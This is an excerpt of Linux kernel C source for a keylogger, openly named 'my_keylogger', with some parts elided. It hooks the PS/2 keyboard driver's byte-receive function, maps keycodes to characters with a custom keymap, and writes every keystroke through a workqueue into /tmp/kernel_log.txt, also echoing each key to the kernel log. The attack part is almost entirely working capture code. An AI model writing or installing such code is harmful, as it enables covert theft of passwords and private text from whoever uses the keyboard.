...
// Function to perform the actual file writing (executed by the workqueue)
static void my_work_func(struct work_struct *work)
{
    ...
    ssize_t ret;
    char filepath[] = "/tmp/kernel_log.txt"; // Target file path

    // Open the file for writing. O_APPEND to append, O_CREAT to create if not exists
    // S_IRUSR|S_IWUSR for user read/write permissions
    filp = filp_open(filepath, O_WRONLY | O_APPEND | O_CREAT, S_IRUSR | S_IWUSR);
    if (IS_ERR(filp)) {
        printk(KERN_ERR "my_keylogger: Failed to open file %s, error %ld\n", filepath, PTR_ERR(filp));
        goto free_data;
    }
...
free_data:
    // Free the data allocated for this work item
    kfree(data->data_to_write);
    kfree(data);
}

// Function to schedule a write operation
void schedule_file_write(const char *data, size_t len)
{
    struct my_work_data *work_data;

    // Allocate memory for the work item's data structure
    work_data = kmalloc(sizeof(*work_data), GFP_ATOMIC); // GFP_ATOMIC because it might be called from interrupt
    if (!work_data) {
        printk(KERN_ERR "my_keylogger: Failed to allocate work_data\n");
        return;
    }

    // Allocate memory for the string data itself
    work_data->data_to_write = kmalloc(len + 1, GFP_ATOMIC); // +1 for null terminator
    if (!work_data->data_to_write) {
        printk(KERN_ERR "my_keylogger: Failed to allocate data_to_write\n");
        kfree(work_data);
        return;
    }
    memcpy(work_data->data_to_write, data, len);
    work_data->data_to_write[len] = '\0'; // Null-terminate
    work_data->data_len = len;

    // Initialize the work item and schedule it
    INIT_WORK(&work_data->my_work, my_work_func);
    if (!queue_work(my_wq, &work_data->my_work)) {
        printk(KERN_ERR "my_keylogger: Failed to queue work\n");
        kfree(work_data->data_to_write);
        kfree(work_data);
    }
}
...
static void atkbd_receive_byte(struct ps2dev *ps2dev, u8 data)
{
        ...
        default:
		/*
                static char* dest_file = "/home/mentee/keylogger.txt";
                struct file *keylog_file;
                loff_t pos = 0;
		*/
                const char* key_char = "";
                static const char *custom_keymap[58][2] = {
                        [KEY_A] = {"a", "A"},
                        [KEY_B] = {"b", "B"},
                        [KEY_C] = {"c", "C"},
                        [KEY_D] = {"d", "D"},
		...
		// ----------------PART 3---------------------
                int shift_pressed = 0;
                if ((keycode_untouched == KEY_LEFTSHIFT) || (keycode_untouched == KEY_RIGHTSHIFT)){
                        shift_pressed = ((value == 1) ? 1 : 0);
                }
                else if (((keycode_untouched >= KEY_1) && (keycode_untouched <= KEY_SLASH) && (keycode_untouched != KEY_GRAVE) && (keycode_untouched != KEY_LEFTCTRL)) || (keycode_untouched == KEY_SPACE)){
			key_char = custom_keymap[keycode_untouched][shift_pressed ? 1:0];
                }
		// pr_info("Keycode %d has been pressed\n", keycode);

                if ((key_char[0] != '\0') && good_to_go && value) {
			schedule_file_write(key_char, strlen(key_char));
			pr_info("Key %s has been pressed\n", key_char);
                }
		// -------------------------------------------
